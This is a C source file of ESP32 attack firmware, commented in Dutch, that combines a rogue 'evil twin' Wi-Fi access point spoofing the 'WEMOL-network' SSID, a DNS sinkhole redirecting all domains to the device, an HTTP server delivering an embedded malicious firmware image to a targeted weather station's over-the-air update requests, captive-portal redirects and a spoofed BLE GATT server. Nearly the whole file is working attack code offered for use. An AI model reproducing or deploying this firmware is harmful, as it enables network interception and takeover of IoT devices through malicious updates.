/**
 * ╔══════════════════════════════════════════════════════════════════════════╗
 * ║  ESP32 Evil Twin + Malicious OTA + BLE Hijack — Combined Attack Firmware ║
 * ║  Doel: Rogue AP + valse firmware server + BLE GATT hijack                ║
 * ║  Aanval: DNS sinkhole → fake OTA .bin + BLE notification spoofing        ║
 * ╚══════════════════════════════════════════════════════════════════════════╝
 *
 * Architectuur:
 *   - Eén ESP32, dual-core FreeRTOS
 *   - SoftAP (Evil Twin) op WIFI_MODE_APSTA
 *   - DNS sinkhole op UDP:53 → alles naar 192.168.1.1
 *   - HTTP server (esp_http_server) met OTA .bin endpoint
 *   - Malicious payload ingebed via EMBED_FILES (geen SPIFFS nodig)
 *   - BLE GATT server (Bluedroid) met spoofed device name en notificaties
 *   - Beide aanvallen (WiFi + BLE) draaien concurrent vanaf boot
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/param.h>
#include <stdint.h>
#include <stdbool.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include "esp_system.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_log.h"
#include "nvs_flash.h"
#include "nvs.h"
#include "esp_mac.h"
#include "lwip/err.h"
#include "lwip/sys.h"
#include "lwip/inet.h"
#include "lwip/sockets.h"
#include "lwip/ip4_addr.h"
#include "esp_http_server.h"

/* ════════════════════════════════════════════════════════════════════════════
 * BLE HIJACK ATTACK - INCLUDES
 * ════════════════════════════════════════════════════════════════════════════ */
#include "esp_bt.h"
#include "esp_gap_ble_api.h"
#include "esp_gatts_api.h"
#include "esp_bt_main.h"
#include "esp_gatt_common_api.h"
/* ════════════════════════════════════════════════════════════════════════════ */

/* ─────────────── Configuratie ─────────────── */

#define ATTACK_SSID         "WEMOL-network"     // SSID van het te spoofen netwerk
#define AP_IP_ADDR          192, 168, 1, 1
#define AP_NETMASK          255, 255, 255, 0
#define DNS_PORT            53
#define OTA_CONTENT_TYPE    "application/octet-stream"
#define MAX_CLIENTS         10

/* OTA endpoints waarop de .bin geserveerd wordt */
static const char *OTA_ENDPOINTS[] = {
    "/firmware.bin",
    "/update.bin",
    "/ota.bin",
    "/firmware",
    "/fw.bin",
    NULL                        // sentinel
};

static const char *TAG = "EVIL_TWIN_OTA";

/* ════════════════════════════════════════════════════════════════════════════
 * BLE HIJACK ATTACK - CONFIGURATION
 * ════════════════════════════════════════════════════════════════════════════ */
#define GATTS_TAG "GATTS_ACS"

#define DEVICE_NAME              "ESP_GATTS_DEMO"
#define GATTS_SERVICE_UUID       0x00FF
#define GATTS_CHAR_UUID          0xFF01
#define GATTS_NUM_HANDLE         4   /* service + char decl + char value + CCCD */

#define PROFILE_NUM              1
#define PROFILE_APP_IDX          0
#define APP_ID                   0x55

static uint8_t adv_service_uuid128[16] = {
    /* LSB <--------------------------------------------------------------> MSB */
    0xfb, 0x34, 0x9b, 0x5f, 0x80, 0x00, 0x00, 0x80,
    0x00, 0x10, 0x00, 0x00, 0xFF, 0x00, 0x00, 0x00, /* 16-bit UUID 0x00FF */
};

static esp_ble_adv_data_t adv_data = {
    .set_scan_rsp        = false,
    .include_name        = true,
    .include_txpower     = false,
    .min_interval        = 0x0006,
    .max_interval        = 0x0010,
    .appearance          = 0x00,
    .manufacturer_len    = 0,
    .p_manufacturer_data = NULL,
    .service_data_len    = 0,
    .p_service_data      = NULL,
    .service_uuid_len    = sizeof(adv_service_uuid128),
    .p_service_uuid      = adv_service_uuid128,
    .flag                = (ESP_BLE_ADV_FLAG_GEN_DISC | ESP_BLE_ADV_FLAG_BREDR_NOT_SPT),
};

static esp_ble_adv_data_t scan_rsp_data = {
    .set_scan_rsp        = true,
    .include_name        = true,
    .include_txpower     = true,
    .service_uuid_len    = sizeof(adv_service_uuid128),
    .p_service_uuid      = adv_service_uuid128,
    .flag                = (ESP_BLE_ADV_FLAG_GEN_DISC | ESP_BLE_ADV_FLAG_BREDR_NOT_SPT),
};

static esp_ble_adv_params_t adv_params = {
    .adv_int_min       = 0x20,
    .adv_int_max       = 0x40,
    .adv_type          = ADV_TYPE_IND,
    .own_addr_type     = BLE_ADDR_TYPE_PUBLIC,
    .channel_map       = ADV_CHNL_ALL,
    .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
};

static uint8_t adv_config_done = 0;
#define ADV_CONFIG_FLAG      (1 << 0)
#define SCAN_RSP_CONFIG_FLAG (1 << 1)

struct gatts_profile_inst {
    esp_gatts_cb_t gatts_cb;
    uint16_t gatts_if;
    uint16_t app_id;
    uint16_t conn_id;
    uint16_t service_handle;
    esp_gatt_srvc_id_t service_id;
    uint16_t char_handle;
    esp_bt_uuid_t char_uuid;
    uint16_t descr_handle;
    esp_bt_uuid_t descr_uuid;
};

/* Forward declaration */
static void gatts_profile_event_handler(esp_gatts_cb_event_t event,
                                        esp_gatt_if_t gatts_if,
                                        esp_ble_gatts_cb_param_t *param);

static struct gatts_profile_inst gl_profile_tab[PROFILE_NUM] = {
    [PROFILE_APP_IDX] = {
        .gatts_cb = gatts_profile_event_handler,
        .gatts_if = ESP_GATT_IF_NONE,
    },
};

/* BLE State */
static bool     is_connected     = false;
static bool     notify_enabled   = false;
static TaskHandle_t notify_task_handle = NULL;
/* ════════════════════════════════════════════════════════════════════════════ */

/* Embedded malicious payload — gegenereerd uit payload project.
 * Symbolen: _binary_<bestandsnaam>_start / _end
 * Pad in CMakeLists: EMBED_FILES "../malicious_payload.bin"
 */
extern const uint8_t malicious_payload_bin_start[] asm("_binary_malicious_payload_bin_start");
extern const uint8_t malicious_payload_bin_end[]   asm("_binary_malicious_payload_bin_end");

/* ─────────────── Admin / Status ─────────────── */

typedef struct {
    uint32_t clients_connected;
    uint32_t ota_requests_served;
    uint32_t boot_time_ticks;
    bool     cloning_active;     /* van network_cloner (optioneel) */
} attack_state_t;

static attack_state_t g_state = {0};
static SemaphoreHandle_t g_mutex = NULL;

/* ════════════════════════════════════════════════════════════════════════════
 * BLE HIJACK ATTACK - NOTIFY TASK
 * ════════════════════════════════════════════════════════════════════════════ */
static void notify_task(void *arg)
{
    const char payload[] = "ACS!";  /* 4 bytes, no null terminator sent */
    while (1) {
        if (is_connected && notify_enabled) {
            esp_err_t err = esp_ble_gatts_send_indicate(
                gl_profile_tab[PROFILE_APP_IDX].gatts_if,
                gl_profile_tab[PROFILE_APP_IDX].conn_id,
                gl_profile_tab[PROFILE_APP_IDX].char_handle,
                4, (uint8_t *)payload,
                false /* false = notification, true = indication */);
            if (err != ESP_OK) {
                ESP_LOGW(GATTS_TAG, "send_indicate failed: %s", esp_err_to_name(err));
            } else {
                ESP_LOGI(GATTS_TAG, "Sent notify: ACS!");
            }
        }
        vTaskDelay(pdMS_TO_TICKS(1000));
    }
}
/* ════════════════════════════════════════════════════════════════════════════ */

/* ════════════════════════════════════════════════════════════════════════════
 * BLE HIJACK ATTACK - GAP EVENT HANDLER
 * ════════════════════════════════════════════════════════════════════════════ */
static void gap_event_handler(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param)
{
    switch (event) {
    case ESP_GAP_BLE_ADV_DATA_SET_COMPLETE_EVT:
        adv_config_done &= (~ADV_CONFIG_FLAG);
        if (adv_config_done == 0) {
            esp_ble_gap_start_advertising(&adv_params);
        }
        break;
    case ESP_GAP_BLE_SCAN_RSP_DATA_SET_COMPLETE_EVT:
        adv_config_done &= (~SCAN_RSP_CONFIG_FLAG);
        if (adv_config_done == 0) {
            esp_ble_gap_start_advertising(&adv_params);
        }
        break;
    case ESP_GAP_BLE_ADV_START_COMPLETE_EVT:
        if (param->adv_start_cmpl.status != ESP_BT_STATUS_SUCCESS) {
            ESP_LOGE(GATTS_TAG, "Advertising start failed");
        } else {
            ESP_LOGI(GATTS_TAG, "Advertising started; device name: %s", DEVICE_NAME);
        }
        break;
    case ESP_GAP_BLE_UPDATE_CONN_PARAMS_EVT:
        ESP_LOGI(GATTS_TAG, "Conn params updated: int=%d latency=%d timeout=%d",
                 param->update_conn_params.conn_int,
                 param->update_conn_params.latency,
                 param->update_conn_params.timeout);
        break;
    default:
        break;
    }
}
/* ════════════════════════════════════════════════════════════════════════════ */

/* ════════════════════════════════════════════════════════════════════════════
 * BLE HIJACK ATTACK - GATTS PROFILE EVENT HANDLER
 * ════════════════════════════════════════════════════════════════════════════ */
static void gatts_profile_event_handler(esp_gatts_cb_event_t event,
                                        esp_gatt_if_t gatts_if,
                                        esp_ble_gatts_cb_param_t *param)
{
    switch (event) {
    case ESP_GATTS_REG_EVT: {
        ESP_LOGI(GATTS_TAG, "REG_EVT, status %d, app_id %d", param->reg.status, param->reg.app_id);

        gl_profile_tab[PROFILE_APP_IDX].service_id.is_primary       = true;
        gl_profile_tab[PROFILE_APP_IDX].service_id.id.inst_id       = 0x00;
        gl_profile_tab[PROFILE_APP_IDX].service_id.id.uuid.len      = ESP_UUID_LEN_16;
        gl_profile_tab[PROFILE_APP_IDX].service_id.id.uuid.uuid.uuid16 = GATTS_SERVICE_UUID;

        esp_ble_gap_set_device_name(DEVICE_NAME);

        esp_err_t r1 = esp_ble_gap_config_adv_data(&adv_data);
        if (r1) ESP_LOGE(GATTS_TAG, "config adv data err: %x", r1);
        adv_config_done |= ADV_CONFIG_FLAG;

        esp_err_t r2 = esp_ble_gap_config_adv_data(&scan_rsp_data);
        if (r2) ESP_LOGE(GATTS_TAG, "config scan rsp data err: %x", r2);
        adv_config_done |= SCAN_RSP_CONFIG_FLAG;

        esp_ble_gatts_create_service(gatts_if,
                                     &gl_profile_tab[PROFILE_APP_IDX].service_id,
                                     GATTS_NUM_HANDLE);
        break;
    }
    case ESP_GATTS_CREATE_EVT: {
        ESP_LOGI(GATTS_TAG, "CREATE_EVT, status %d, service_handle %d",
                 param->create.status, param->create.service_handle);
        gl_profile_tab[PROFILE_APP_IDX].service_handle = param->create.service_handle;
        gl_profile_tab[PROFILE_APP_IDX].char_uuid.len = ESP_UUID_LEN_16;
        gl_profile_tab[PROFILE_APP_IDX].char_uuid.uuid.uuid16 = GATTS_CHAR_UUID;

        esp_ble_gatts_start_service(gl_profile_tab[PROFILE_APP_IDX].service_handle);

        esp_gatt_char_prop_t prop = ESP_GATT_CHAR_PROP_BIT_READ
                                  | ESP_GATT_CHAR_PROP_BIT_WRITE
                                  | ESP_GATT_CHAR_PROP_BIT_NOTIFY;

        /* Initial char value */
        static uint8_t char_init_val[4] = {'A','C','S','!'};
        esp_attr_value_t char_val = {
            .attr_max_len = 20,
            .attr_len     = sizeof(char_init_val),
            .attr_value   = char_init_val,
        };

        esp_err_t add_char_ret = esp_ble_gatts_add_char(
            gl_profile_tab[PROFILE_APP_IDX].service_handle,
            &gl_profile_tab[PROFILE_APP_IDX].char_uuid,
            ESP_GATT_PERM_READ | ESP_GATT_PERM_WRITE,
            prop,
            &char_val, NULL);
        if (add_char_ret) {
            ESP_LOGE(GATTS_TAG, "add char failed: %x", add_char_ret);
        }
        break;
    }
    case ESP_GATTS_ADD_CHAR_EVT: {
        ESP_LOGI(GATTS_TAG, "ADD_CHAR_EVT, status %d, attr_handle %d",
                 param->add_char.status, param->add_char.attr_handle);
        gl_profile_tab[PROFILE_APP_IDX].char_handle = param->add_char.attr_handle;
        gl_profile_tab[PROFILE_APP_IDX].descr_uuid.len = ESP_UUID_LEN_16;
        gl_profile_tab[PROFILE_APP_IDX].descr_uuid.uuid.uuid16 = ESP_GATT_UUID_CHAR_CLIENT_CONFIG;

        esp_err_t add_descr_ret = esp_ble_gatts_add_char_descr(
            gl_profile_tab[PROFILE_APP_IDX].service_handle,
            &gl_profile_tab[PROFILE_APP_IDX].descr_uuid,
            ESP_GATT_PERM_READ | ESP_GATT_PERM_WRITE,
            NULL, NULL);
        if (add_descr_ret) {
            ESP_LOGE(GATTS_TAG, "add char descr failed: %x", add_descr_ret);
        }
        break;
    }
    case ESP_GATTS_ADD_CHAR_DESCR_EVT:
        gl_profile_tab[PROFILE_APP_IDX].descr_handle = param->add_char_descr.attr_handle;
        ESP_LOGI(GATTS_TAG, "ADD_DESCR_EVT, status %d, descr_handle %d",
                 param->add_char_descr.status, param->add_char_descr.attr_handle);
        break;

    case ESP_GATTS_START_EVT:
        ESP_LOGI(GATTS_TAG, "SERVICE_START, status %d, service_handle %d",
                 param->start.status, param->start.service_handle);
        break;

    case ESP_GATTS_CONNECT_EVT: {
        ESP_LOGI(GATTS_TAG, "Client connected, conn_id %d", param->connect.conn_id);
        gl_profile_tab[PROFILE_APP_IDX].conn_id = param->connect.conn_id;
        is_connected = true;

        esp_ble_conn_update_params_t conn_params = {0};
        memcpy(conn_params.bda, param->connect.remote_bda, sizeof(esp_bd_addr_t));
        conn_params.latency = 0;
        conn_params.max_int = 0x20;   /* 40 ms */
        conn_params.min_int = 0x10;   /* 20 ms */
        conn_params.timeout = 400;    /* 4 s   */
        esp_ble_gap_update_conn_params(&conn_params);
        break;
    }
    case ESP_GATTS_DISCONNECT_EVT:
        ESP_LOGI(GATTS_TAG, "Disconnected, reason 0x%x", param->disconnect.reason);
        is_connected   = false;
        notify_enabled = false;
        esp_ble_gap_start_advertising(&adv_params);
        break;

    case ESP_GATTS_WRITE_EVT: {
        ESP_LOGI(GATTS_TAG, "WRITE_EVT, handle %d, len %d",
                 param->write.handle, param->write.len);
        /* Detect CCCD write to enable/disable notifications */
        if (param->write.handle == gl_profile_tab[PROFILE_APP_IDX].descr_handle &&
            param->write.len == 2) {
            uint16_t cccd = param->write.value[1] << 8 | param->write.value[0];
            if (cccd == 0x0001) {
                ESP_LOGI(GATTS_TAG, "Notifications ENABLED by client");
                notify_enabled = true;
            } else if (cccd == 0x0002) {
                ESP_LOGI(GATTS_TAG, "Indications enabled (not used)");
                notify_enabled = false;
            } else if (cccd == 0x0000) {
                ESP_LOGI(GATTS_TAG, "Notifications DISABLED");
                notify_enabled = false;
            }
        }
        if (param->write.need_rsp) {
            esp_ble_gatts_send_response(gatts_if, param->write.conn_id,
                                        param->write.trans_id, ESP_GATT_OK, NULL);
        }
        break;
    }
    case ESP_GATTS_MTU_EVT:
        ESP_LOGI(GATTS_TAG, "MTU set to %d", param->mtu.mtu);
        break;
    case ESP_GATTS_CONF_EVT:
        /* Confirmation for indications; not used since we send notifications */
        break;
    default:
        break;
    }
}
/* ════════════════════════════════════════════════════════════════════════════ */

/* ════════════════════════════════════════════════════════════════════════════
 * BLE HIJACK ATTACK - GATTS EVENT HANDLER
 * ════════════════════════════════════════════════════════════════════════════ */
static void gatts_event_handler(esp_gatts_cb_event_t event,
                                esp_gatt_if_t gatts_if,
                                esp_ble_gatts_cb_param_t *param)
{
    if (event == ESP_GATTS_REG_EVT) {
        if (param->reg.status == ESP_GATT_OK) {
            gl_profile_tab[PROFILE_APP_IDX].gatts_if = gatts_if;
        } else {
            ESP_LOGE(GATTS_TAG, "Reg app failed, status %d", param->reg.status);
            return;
        }
    }
    for (int idx = 0; idx < PROFILE_NUM; idx++) {
        if (gatts_if == ESP_GATT_IF_NONE || gatts_if == gl_profile_tab[idx].gatts_if) {
            if (gl_profile_tab[idx].gatts_cb) {
                gl_profile_tab[idx].gatts_cb(event, gatts_if, param);
            }
        }
    }
}
/* ════════════════════════════════════════════════════════════════════════════ */

/* ─────────────── Wi-Fi: SoftAP (Evil Twin) ─────────────── */

static void wifi_event_handler(void* arg, esp_event_base_t base, int32_t id, void* data) {
    if (id == WIFI_EVENT_AP_STACONNECTED) {
        wifi_event_ap_staconnected_t *ev = (wifi_event_ap_staconnected_t*)data;
        ESP_LOGI(TAG, "Client connected: " MACSTR, MAC2STR(ev->mac));
        if (xSemaphoreTake(g_mutex, portMAX_DELAY)) {
            g_state.clients_connected++;
            xSemaphoreGive(g_mutex);
        }
    } else if (id == WIFI_EVENT_AP_STADISCONNECTED) {
        wifi_event_ap_stadisconnected_t *ev = (wifi_event_ap_stadisconnected_t*)data;
        ESP_LOGI(TAG, "Client disconnected: " MACSTR, MAC2STR(ev->mac));
    }
}

static void wifi_init_softap(void) {
    esp_netif_t *ap = esp_netif_create_default_wifi_ap();

    /* Statisch IP — de DHCP van de ESP deelt 192.168.1.x uit */
    esp_netif_ip_info_t ip;
    IP4_ADDR(&ip.ip, 192, 168, 1, 1);
    IP4_ADDR(&ip.gw, 192, 168, 1, 1);
    IP4_ADDR(&ip.netmask, 255, 255, 255, 0);
    esp_netif_dhcps_stop(ap);
    esp_netif_set_ip_info(ap, &ip);
    esp_netif_dhcps_start(ap);

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    ESP_ERROR_CHECK(esp_event_handler_instance_register(
        WIFI_EVENT, ESP_EVENT_ANY_ID, &wifi_event_handler, NULL, NULL));

    wifi_config_t wifi_config = {
        .ap = {
            .max_connection = MAX_CLIENTS,
            .authmode       = WIFI_AUTH_OPEN,
        },
    };
    strncpy((char*)wifi_config.ap.ssid, ATTACK_SSID, sizeof(wifi_config.ap.ssid) - 1);
    wifi_config.ap.ssid_len = strlen(ATTACK_SSID);

    /* AP + STA nodig voor channel scan (network_cloner) */
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));

    /* Alle kanalen tot 14 (JP country code) */
    wifi_country_t country = {
        .cc     = "JP",
        .schan  = 1,
        .nchan  = 14,
        .policy = WIFI_COUNTRY_POLICY_MANUAL,
    };
    ESP_ERROR_CHECK(esp_wifi_set_country(&country));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &wifi_config));
    ESP_ERROR_CHECK(esp_wifi_start());

    ESP_LOGI(TAG, "Evil Twin AP gestart — SSID: \"%s\"", ATTACK_SSID);
}

/* ─────────────── DNS Sinkhole ─────────────── */

static void dns_server_task(void *pv) {
    char buf[512];
    struct sockaddr_in addr = {
        .sin_addr.s_addr = htonl(INADDR_ANY),
        .sin_family      = AF_INET,
        .sin_port        = htons(DNS_PORT),
    };

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (sock < 0) { ESP_LOGE(TAG, "DNS socket failed"); vTaskDelete(NULL); return; }
    if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        ESP_LOGE(TAG, "DNS bind failed"); close(sock); vTaskDelete(NULL); return;
    }
    ESP_LOGI(TAG, "DNS sinkhole actief op port 53");

    while (1) {
        struct sockaddr_storage src;
        socklen_t slen = sizeof(src);
        int len = recvfrom(sock, buf, sizeof(buf) - 1, 0, (struct sockaddr*)&src, &slen);
        if (len < 12) continue;                     // te klein voor DNS header

        /* Bouw spoof-response: QR=1, RA=1, ANCOUNT=1 */
        buf[2] |= 0x80;                             // QR + RD
        buf[3] |= 0x80;                             // RA, RCODE=0
        buf[6]  = 0x00; buf[7]  = 0x01;             // ANCOUNT = 1
        buf[8]  = 0x00; buf[9]  = 0x00;             // NSCOUNT = 0
        buf[10] = 0x00; buf[11] = 0x00;             // ARCOUNT = 0

        int rlen = len;
        buf[rlen++] = 0xC0; buf[rlen++] = 0x0C;     // name pointer naar offset 12
        buf[rlen++] = 0x00; buf[rlen++] = 0x01;     // TYPE A
        buf[rlen++] = 0x00; buf[rlen++] = 0x01;     // CLASS IN
        buf[rlen++] = 0x00; buf[rlen++] = 0x00;     // TTL = 60s
        buf[rlen++] = 0x00; buf[rlen++] = 0x3C;
        buf[rlen++] = 0x00; buf[rlen++] = 0x04;     // RDLENGTH = 4
        buf[rlen++] = 192;                           // RDATA = 192.168.1.1
        buf[rlen++] = 168;
        buf[rlen++] = 1;
        buf[rlen++] = 1;

        sendto(sock, buf, rlen, 0, (struct sockaddr*)&src, sizeof(src));
    }
}

/* ─────────────── HTTP: OTA Firmware Server ─────────────── */

/**
 * Serveer de ingebedde malicious_payload.bin.
 * Dit is het kern-onderdeel: de doel-ESP32 (WeMol weerstation)
 * downloadt dit bestand als zijn firmware-update.
 */
static esp_err_t ota_firmware_handler(httpd_req_t *req) {
    size_t fw_size = malicious_payload_bin_end - malicious_payload_bin_start;

    ESP_LOGI(TAG, "OTA request: %s (size=%u)", req->uri, fw_size);

    httpd_resp_set_type(req, OTA_CONTENT_TYPE);
    httpd_resp_set_hdr(req, "Content-Disposition",
                       "attachment; filename=\"firmware.bin\"");

    /* Zet header voor grote bestanden — chunked transfer */
    esp_err_t ret = httpd_resp_send(req,
                      (const char*)malicious_payload_bin_start, fw_size);

    if (xSemaphoreTake(g_mutex, portMAX_DELAY)) {
        g_state.ota_requests_served++;
        xSemaphoreGive(g_mutex);
    }

    ESP_LOGI(TAG, "OTA response verzonden (%s)", ret == ESP_OK ? "OK" : "FAIL");
    return ret;
}

/**
 * Vang elke request die eindigt op .bin — serveer de malafide firmware.
 * Dit dekt onbekende OTA-paden af zonder alle mogelijkheden te hardcoden.
 */
static esp_err_t catchall_bin_handler(httpd_req_t *req, httpd_err_code_t error) {
    size_t uri_len = strlen(req->uri);
    /* Alleen .bin requests afhandelen, niets anders */
    if (uri_len < 5 ||
        strcasecmp(req->uri + uri_len - 4, ".bin") != 0) {
        httpd_resp_set_status(req, "404 Not Found");
        httpd_resp_send(req, "Not Found", HTTPD_RESP_USE_STRLEN);
        return ESP_FAIL;
    }
    return ota_firmware_handler(req);
}

/* ─────────────── HTTP: Captive Portal Bypass ─────────────── */

static esp_err_t redirect_handler(httpd_req_t *req) {
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", "http://192.168.1.1/");
    httpd_resp_send(req, NULL, 0);
    return ESP_OK;
}

static esp_err_t root_handler(httpd_req_t *req) {
    const char *html =
        "<!DOCTYPE html>"
        "<html><head><title>" ATTACK_SSID "</title>"
        "<meta name='viewport' content='width=device-width'>"
        "<style>"
        "body{font-family:sans-serif;background:#1a1a2e;color:#eee;"
        "display:flex;align-items:center;justify-content:center;"
        "min-height:100vh;margin:0;text-align:center;padding:20px;}"
        ".card{background:#16213e;padding:40px;border-radius:12px;"
        "max-width:420px;box-shadow:0 8px 32px rgba(0,0,0,.3);}"
        "h1{color:#e94560;font-size:24px;margin-bottom:10px;}"
        "p{color:#a0a0b0;line-height:1.5}"
        ".status{color:#4ade80;font-size:14px;margin-top:15px;}"
        "</style></head><body>"
        "<div class='card'>"
        "<h1>" ATTACK_SSID "</h1>"
        "<p>Je bent verbonden. Het apparaat wordt geconfigureerd.</p>"
        "<p class='status'>&#10003; Verbinding geslaagd</p>"
        "</div></body></html>";
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, html, HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

/* ─────────────── HTTP: Admin / Status ─────────────── */

static esp_err_t admin_handler(httpd_req_t *req) {
    xSemaphoreTake(g_mutex, portMAX_DELAY);
    uint32_t clients  = g_state.clients_connected;
    uint32_t served   = g_state.ota_requests_served;
    xSemaphoreGive(g_mutex);

    uint32_t uptime_s = xTaskGetTickCount() * portTICK_PERIOD_MS / 1000;
    uint32_t fw_size  = malicious_payload_bin_end - malicious_payload_bin_start;

    char buf[1024];
    int n = snprintf(buf, sizeof(buf),
        "{\n"
        "  \"ssid\": \"%s\",\n"
        "  \"uptime_s\": %lu,\n"
        "  \"clients_total\": %lu,\n"
        "  \"ota_requests\": %lu,\n"
        "  \"payload_size\": %lu,\n"
        "  \"payload_hex_sha256\": \"(zie payload dir)\"\n"
        "}\n",
        ATTACK_SSID, uptime_s, clients, served, fw_size);

    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, buf, n);
    return ESP_OK;
}

/* ─────────────── HTTP: Server Start ─────────────── */

static httpd_handle_t start_webserver(void) {
    httpd_handle_t srv = NULL;
    httpd_config_t cfg = HTTPD_DEFAULT_CONFIG();
    cfg.max_uri_handlers  = 16;
    cfg.lru_purge_enable  = true;
    cfg.stack_size        = 4096;
    cfg.max_open_sockets  = 7;
    cfg.keep_alive_enable = false;

    if (httpd_start(&srv, &cfg) != ESP_OK) {
        ESP_LOGE(TAG, "HTTP server start mislukt");
        return NULL;
    }

    /* OTA firmware endpoints */
    for (int i = 0; OTA_ENDPOINTS[i] != NULL; i++) {
        httpd_uri_t uri = {
            .uri     = OTA_ENDPOINTS[i],
            .method  = HTTP_GET,
            .handler = ota_firmware_handler,
        };
        httpd_register_uri_handler(srv, &uri);
    }

    /* Catch-all .bin → serveer firmware */
    httpd_register_err_handler(srv, HTTPD_404_NOT_FOUND, catchall_bin_handler);

    /* Captive portal bypass (Android/iOS detectie) */
    httpd_uri_t redirects[] = {
        {.uri = "/generate_204",       .method = HTTP_GET, .handler = redirect_handler},
        {.uri = "/hotspot-detect.html",.method = HTTP_GET, .handler = redirect_handler},
        {.uri = "/success.txt",        .method = HTTP_GET, .handler = redirect_handler},
        {.uri = "/ncsi.txt",           .method = HTTP_GET, .handler = redirect_handler},
        {.uri = "/connecttest.txt",    .method = HTTP_GET, .handler = redirect_handler},
    };
    for (int i = 0; i < sizeof(redirects)/sizeof(redirects[0]); i++)
        httpd_register_uri_handler(srv, &redirects[i]);

    /* Root (zonder login-pagina, minimale weergave) */
    httpd_uri_t uri_root = {.uri = "/", .method = HTTP_GET, .handler = root_handler};
    httpd_register_uri_handler(srv, &uri_root);

    /* Admin status */
    httpd_uri_t uri_admin = {.uri = "/admin", .method = HTTP_GET, .handler = admin_handler};
    httpd_register_uri_handler(srv, &uri_admin);

    ESP_LOGI(TAG, "HTTP server gestart — OTA endpoints actief");
    return srv;
}

/* ─────────────── Main ─────────────── */

void app_main(void) {
    /* NVS init */
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());

    g_mutex = xSemaphoreCreateMutex();
    assert(g_mutex);

    /* ════════════════════════════════════════════════════════════════════════
     * BLE HIJACK ATTACK - INITIALIZATION
     * ════════════════════════════════════════════════════════════════════════ */
    ESP_LOGI(TAG, "Initializing BLE attack...");

    ESP_ERROR_CHECK(esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT));

    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_bt_controller_init(&bt_cfg));
    ESP_ERROR_CHECK(esp_bt_controller_enable(ESP_BT_MODE_BLE));

    esp_bluedroid_config_t ble_cfg = BT_BLUEDROID_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_bluedroid_init_with_cfg(&ble_cfg));
    ESP_ERROR_CHECK(esp_bluedroid_enable());

    ESP_ERROR_CHECK(esp_ble_gatts_register_callback(gatts_event_handler));
    ESP_ERROR_CHECK(esp_ble_gap_register_callback(gap_event_handler));
    ESP_ERROR_CHECK(esp_ble_gatts_app_register(APP_ID));

    ESP_ERROR_CHECK(esp_ble_gatt_set_local_mtu(500));

    xTaskCreate(notify_task, "notify_task", 4096, NULL, 5, &notify_task_handle);

    ESP_LOGI(TAG, "BLE attack initialized and running");
    /* ════════════════════════════════════════════════════════════════════════ */

    /* Evil Twin SoftAP */
    wifi_init_softap();

    /* DNS sinkhole (eigen task) */
    xTaskCreate(dns_server_task, "dns_task", 3072, NULL, 5, NULL);

    /* HTTP server met OTA endpoints */
    start_webserver();

    /* Grootte van ingebedde payload loggen */
    size_t fw_size = malicious_payload_bin_end - malicious_payload_bin_start;
    ESP_LOGI(TAG, "Malicious payload ingeladen: %u bytes", fw_size);
    ESP_LOGI(TAG, "=== AANVAL ACTIEF ===");
    ESP_LOGI(TAG, "SSID: \"%s\" op 192.168.1.1", ATTACK_SSID);
    ESP_LOGI(TAG, "DNS sinkhole: alle domeinen -> 192.168.1.1");
    ESP_LOGI(TAG, "OTA server: /firmware.bin, /update.bin, /ota.bin (+ elk *.bin)");
    ESP_LOGI(TAG, "BLE GATT server: \"%s\" (UUID 0x00FF, characteristic 0xFF01)", DEVICE_NAME);

    /* Idle loop — alle werk gebeurt in andere tasks */
    while (1) {
        vTaskDelay(pdMS_TO_TICKS(60000));
    }
}
